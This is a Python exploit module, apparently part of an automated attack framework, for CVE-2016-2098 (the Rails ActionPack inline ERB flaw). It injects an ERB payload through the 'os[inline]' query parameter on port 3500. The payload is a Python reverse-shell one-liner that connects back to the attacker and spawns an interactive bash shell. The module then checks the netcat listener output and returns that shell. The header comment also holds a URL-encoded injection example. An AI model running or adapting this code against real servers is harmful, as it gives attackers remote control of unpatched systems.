#######################################################
# ruby actionpack inline erb
# CVE-2016-2098
# Metasploit: exploit/multi/http/rails_actionpack_inline_exec
#
# This exploit uses a vulnerability in the request
# processor of the exposed Ruby on Rails website at 
# port 3500 to obtain RCE. It sends malicious data via
# a query parameter which is executed by the server.
#
# Example:
# http://{TARGET_IP}:3500/readme?os[inline]=%3C%25=%20%25x(echo%20hacked)%20%25%3E
#######################################################

from utils import Exploit
import requests
from urllib.parse import quote
import re
import time
from shells.reverse_shell import ReverseShell

class RubyActionPackInlineERB(Exploit):
    '''Class to perform the Ruby ActionPack Inline ERB exploit'''
    CODE = "<%= %x({CMD}) %>"
    CMD = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{server_ip}",{server_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' &'''

    def __init__(self, server_ip: str):
        super().__init__(
            os='linux',
            name='Ruby on Rails ActionPack Inline ERB',
            description='',
            requirements=['http/3500'],
            webserver=False,
            server_ip=server_ip
        )

    def payload(self, server_ip, server_port):
        '''Format and return payload string with proper network details'''
        cmd = self.CMD.format(server_ip=server_ip, server_port=server_port)
        code = self.CODE.format(CMD=cmd)
        return code
    
    def attack(self, target: str):
        '''Perform the attack on a target and return a reverse shell'''
        # Create reverse shell listener
        revshell = ReverseShell(target, self.os)
        # Send payload to connect to reverse shell
        try:
            r = requests.get(f'http://{target}:3500/readme',
                headers = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                },
                params={
                    "os[inline]": self.payload(self.server_ip, revshell.get_port())
                },
                timeout=10
            )
        except OSError:
            self.error(target, 'Could not connect to webserver.')
            revshell.kill()
            return
        except Exception as e:
            self.error(target, 'An unknown error occured:', e)
            revshell.kill()
            return

        # Give time for reverse shell to connect
        time.sleep(3)
        
        # Get netcat output
        output = revshell.get_all_output()
        # Check if a connection was received
        if re.search(r'connect to \[' + self.server_ip + r'] from .* \[' + target + r']', output):
            self.message(target, 'Received reverse shell connection')
            # Return reverse shell
            self.success(target)
            return revshell
        else:
            self.error(target, 'Did not receive reverse shell connection')
